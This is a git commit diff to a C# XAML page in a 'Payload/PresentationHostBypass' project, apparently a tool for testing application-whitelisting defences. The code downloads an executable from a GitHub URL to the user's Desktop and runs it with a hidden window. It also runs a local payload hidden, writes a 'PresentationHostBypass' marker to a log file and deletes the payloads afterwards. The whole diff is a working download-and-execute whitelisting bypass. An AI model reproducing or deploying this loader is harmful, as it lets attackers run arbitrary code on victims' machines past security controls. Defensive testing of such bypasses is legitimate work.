242b5760de00fdd2746f53d1d1287901d8d25d45
unknown <A70002@itri.org.tw>
2020-07-06 18:56:35 +0800

    20200706

--- Payload/PresentationHostBypass/powershell/Page1.xaml.cs
+++ Payload/PresentationHostBypass/powershell/Page1.xaml.cs
@@ -1,9 +1,10 @@
-﻿using System.Net;
+﻿using System;
+using System.IO;
+using System.Net;
 using System.Windows;
 using System.Windows.Controls;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
-
 
 namespace powershell
 {
@@ -16,48 +17,60 @@ namespace powershell
         }
         private void Execute()
         {
-            string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/PresentationHostBBypass/PresentationHostBOnlinePayload.exe";
-            string fileName = "PresentationHostBOnlinePayloadDownloaded.exe", myStringWebResource = null;
+            string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/PresentationHostBypass/PresentationHostOnlinePayload.exe";
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string fileName = "\\PresentationHostOnlinePayloadDownloaded.exe", myStringWebResource = null;
+            string downloadPath = path + fileName;
             // Create a new WebClient instance.
             WebClient myWebClient = new WebClient();
-            // Concatenate the domain with the Web resource filename.
-            myStringWebResource = remoteUri + fileName;
             try {
+                string title = "PresentationHost";
+                string message = "Download path:" + downloadPath;
+                //MessageBox.Show(message, title);
                 // Download the Web resource and save it into the current filesystem folder.
-                myWebClient.DownloadFile(myStringWebResource, fileName);
+                myWebClient.DownloadFile(remoteUri, downloadPath);
                 System.Diagnostics.Process process = new System.Diagnostics.Process();
             } catch {
             }
             System.Diagnostics.Process processA = new System.Diagnostics.Process();
             System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
             startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfoA.FileName = "PresentationHostBOnlinePayloadDownloaded.exe";
+            startInfoA.FileName = downloadPath;
             processA.StartInfo = startInfoA;
             try {
                 processA.Start();
             } catch {
             }
-
+            
+            string localPath = path + "\\PresentationHostOfflinePayload.exe";
             System.Diagnostics.Process processB = new System.Diagnostics.Process();
             System.Diagnostics.ProcessStartInfo startInfoB = new System.Diagnostics.ProcessStartInfo();
             startInfoB.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfoB.FileName = "PresentationHostBOfflinePayload.exe";
+            startInfoB.FileName = localPath;
             processB.StartInfo = startInfoB;
             try
             {
+                string title = "PresentationHost";
+                string message = "Local path:" + localPath;
+                //MessageBox.Show(message, title);
                 processB.Start();
             }
             catch
             {
             }
 
-            string command = "$DesktopPath = [Environment]::GetFolderPath('Desktop');echo PresentationHostBypass >> $DesktopPath\\WLtester.txt;";
-            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
-            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
-            rspace.Open();
-            Pipeline pipeline = rspace.CreatePipeline();
-            pipeline.Commands.AddScript(command);
-            pipeline.InvokeAsync();
+            string filename = "\\WLtester.txt";
+            path += filename;
+            using (FileStream file = File.Exists(path) ? File.Open(path, FileMode.Append) : File.Open(path, FileMode.CreateNew))
+            {
+                using (StreamWriter stream = new StreamWriter(file))
+                {
+                    stream.WriteLine("PresentationHostBypass.");
+                }
+            }
+
+            File.Delete(downloadPath);
+            File.Delete(localPath);
         }
     }
 }
